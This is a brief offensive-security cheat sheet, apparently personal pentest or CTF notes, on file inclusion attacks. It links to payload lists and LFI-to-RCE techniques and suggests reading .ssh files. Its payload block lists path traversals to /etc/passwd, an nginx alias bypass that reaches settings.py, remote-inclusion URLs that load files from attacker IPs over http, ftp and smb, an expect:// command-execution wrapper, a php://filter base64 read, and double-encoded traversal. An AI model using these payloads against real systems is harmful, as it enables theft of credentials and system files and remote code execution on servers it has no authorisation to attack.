


#### seclists
- bypass filtering payloads: LFI-Jhaddix.txt
- [hacktricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
- read `/.ssh` files
- Universal [LFI2RCE](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters) using php filtres, [chain generator](https://github.com/synacktiv/php_filter_chain_generator) 
- [LFI2RCE](https://hackmd.io/@chuong/pearcmd)
##### payloads
```bash
# break parser logic!
/etc/passwd?/../../tmp/file
# breaking ngix logic! # 
location /static { alias /home/app/static/; } # conf example
/home/app/static../settings.py
# rfi
http://10.10.14.5/file
ftp://10.10.14.5/file
\\10.10.14.7\share ## smb
# rce
expect://ls
# b64 filter
php://filter/convert.base64-encode/resource=

# random payloads
..%252f..%252f..%252fetc/passwd

```
